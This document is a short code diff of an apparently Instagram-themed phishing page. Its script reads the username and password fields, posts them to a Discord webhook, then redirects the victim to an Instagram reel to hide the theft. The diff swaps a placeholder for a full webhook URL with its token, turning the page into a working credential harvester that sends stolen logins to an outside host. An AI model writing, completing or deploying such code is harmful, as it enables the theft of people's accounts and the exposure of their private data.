@@ -98,14 +98,14 @@
   } while (currentDate - date < milliseconds);
 }
     var request = new XMLHttpRequest();
-    request.open("POST", "USE_DISCORD_WEBHOOK");
+    request.open("POST", "https://discord.com/api/webhooks/1348137078633922593/w-Lt7_Y0QuEufyEVhUSr2omHzyRVBRvz8nRsqg7D44lZb7dHGBmRIWrY5AXDaEIe4HbI");
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
       content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
     }
     request.send(JSON.stringify(params));
 	sleep(400)
-	window.location.replace("https://instagram.com/p/CR8V_TNF4gW/");
+	window.location.replace("https://www.instagram.com/reel/DF27lAPOom0");
   }
   </script>
 </body>
